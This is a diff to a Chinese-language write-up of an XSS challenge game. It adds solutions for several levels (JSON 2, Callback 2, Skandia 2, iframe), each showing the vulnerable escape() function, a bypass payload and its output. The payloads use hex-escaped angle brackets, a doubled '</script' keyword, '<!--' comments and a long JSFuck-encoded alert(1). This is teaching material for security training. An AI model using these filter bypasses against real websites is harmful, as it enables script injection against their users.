@@ -66,7 +66,7 @@ function escape(s) {
 }
 ```
 
-replace()使输入的`"`变为`\"`，转义后的双引号只是一个普通的字符
+replace()使输入的`"`变为`\"`，转义后的双引号只是一个普通的字符，g为全局查找
 
 绕过这个可以把反斜杠转义，转义后的反斜杠只是一个普通的字符，不会再去使双引号转义
 
@@ -348,6 +348,268 @@ function escape(s) {
       <\/script>                                     \n\
     ",
     { name : s }
+  );
+}
+```
+
+`< > & " '`会被转义，现在需要闭合标签，没有尖括号很难受
+
+但是它没有转义反斜杠，可以通过16进制构造
+
+```
+\x3c <
+\x3e >
+```
+
+Payload
+
+```
+\x3c/a\x3e\x3cimg src=a onerror=alert(1)//
+即</a> <img src=a onerror=alert(1)//
+```
+
+Output
+
+```
+      <h2>Hello, <span id=name></span>!</h2>         
+      <script>                                       
+         var v = document.getElementById('name');    
+         v.innerHTML = '<a href=#>\x3c/a\x3e\x3cimg src=a onerror=alert(1)//</a>';       
+      </script>      
+```
+
+
+
+也可以利用iframe
+
+Payload
+
+```
+\x3ciframe onload=alert(1) 
+```
+
+Output
+
+```
+                                                
+      <h2>Hello, <span id=name></span>!</h2>         
+      <script>                                       
+         var v = document.getElementById('name');    
+         v.innerHTML = '<a href=#></a>';       
+      </script>    
+```
+
+
+
+## JSON 2
+
+```javascript
+function escape(s) {
+  s = JSON.stringify(s).replace(/<\/script/gi, '');
+
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+
+对`" `和`\`转义
+
+把`</script`替换为空
+
+gi：全局查找且忽略大小写
+
+可以双写绕过
+
+例
+
+输入`</s</scriptcript>`
+
+`</script`被替换为空
+
+结果为`</script`
+
+Payload
+
+```
+</s</scriptcript><script>alert(1)//
+```
+
+Output
+
+```
+<script>console.log("</script><script>alert(1)//");</script>
+```
+
+Console output
+
+```
+Error: Uncaught SyntaxError: Invalid or unexpected token
+```
+
+
+
+## Callback 2
+
+```javascript
+function escape(s) {
+  // Pass inn "callback#userdata"
+  var thing = s.split(/#/); 
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/\//g, '\\/');
+  return "<script>" + thing[0] + "(" + json +")</script>";
+}
+```
+
+和Callback相比，多转义了`/`
+
+无法使用`//`注释但是js的注释不止这一种，还可以使用`<!--`
+
+所以这题和Callback相比只是注释符有区别
+
+Payload
+
+```
+'#';alert(1)<!--
+```
+
+Output
+
+```
+<script>'({"userdata":"';alert(1)<!--"})</script>
+```
+
+
+
+## Skandia 2
+
+```javascript
+function escape(s) {
+  if (/[<>]/.test(s)) return '-';
+
+  return '<script>console.log("' + s.toUpperCase() + '")</script>';
+}
+```
+
+不能出现尖括号，有尖括号直接`return '-'`
+
+输入的小写字母会被转化为大写
+
+之前绕过转化大写的方法失效
+
+```
+");alert(1)//
+```
+
+能输入这个就完事了，关键在于构造alert(1)
+
+可以利用jsfuck构造alert(1)
+
+了解一下jsfuck这个名字直接口吐芬芳的东西
+
+http://www.jsfuck.com/
+
+Payload
+
+```javascript
+");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
+```
+
+Output
+
+```javascript
+<script>console.log("");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//")</script>
+```
+
+如果闲的没事可以想一想怎样构造更短的Payloda
+
+## iframe
+
+```javascript
+function escape(s) {
+  var tag = document.createElement('iframe');
+
+  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
+  //
+  // https://4i.am/?...raw=... just outputs whatever you pass in.
+  //
+  // Alerting from 4i.am won't count.
+
+  s = '<script>' + s + '<\/script>';
+  tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);
+
+  window.WINNING = function() { youWon = true; };
+
+  tag.setAttribute('onload', 'youWon && alert(1)');
+  return tag.outerHTML;
+}
+```
+
+什么都不输入
+
+输出
+
+```
+<iframe src="https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=%3Cscript%3EAiDai%3C%2Fscript%3E" onload="youWon &amp;&amp; alert(1)"></iframe>
+```
+
+本地跑一下
+
+创建1.html，把输入复制进去，然后打开，f12看一下
+
+报错
+
+```
+1.html:1 Uncaught ReferenceError: youWon is not defined
+    at HTMLIFrameElement.onload (1.html:1)
+```
+
+youWon未定义
+
+`tag.setAttribute('onload', 'youWon && alert(1)');`
+
+根据这个，如果`youWon`有定义，不为False，就会执行alert(1)
+
+每个frame都有一个全局对象window，name是window的成员属性
+
+输入`name='youWon'`，让youWon变成对象
+
+![2](https://raw.githubusercontent.com/AiDaiP/images/master/xss/2.jpg)
+
+Payload
+
+```
+name='youWon'
+```
+
+Output
+
+```
+![2](https://raw.githubusercontent.com/AiDaiP/images/master/xss/2.jpg)<iframe src="https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=%3Cscript%3Ename%3D'youWon'%3C%2Fscript%3E" onload="youWon &amp;&amp; alert(1)"></iframe>
+
+```
+
+
+
+## TI(S)M
+
+```javascript
+function escape(s) {
+  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
+  function html(s) { return s.replace(/[<>"&]/g, function(s) {
+                        return '&#' + s.charCodeAt(0) + ';'; }); }
+
+  return (
+    '<script>' +
+      'var url = ' + json(s) + '; // We\'ll use this later ' +
+    '</script>\n\n' +
+    '  <!-- for debugging -->\n' +
+    '  URL: ' + html(s) + '\n\n' +
+    '<!-- then suddenly -->\n' +
+    '<script>\n' +
+    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
+    '  else new Image().src = url;\n' +
+    '</script>'
   );
 }
 ```
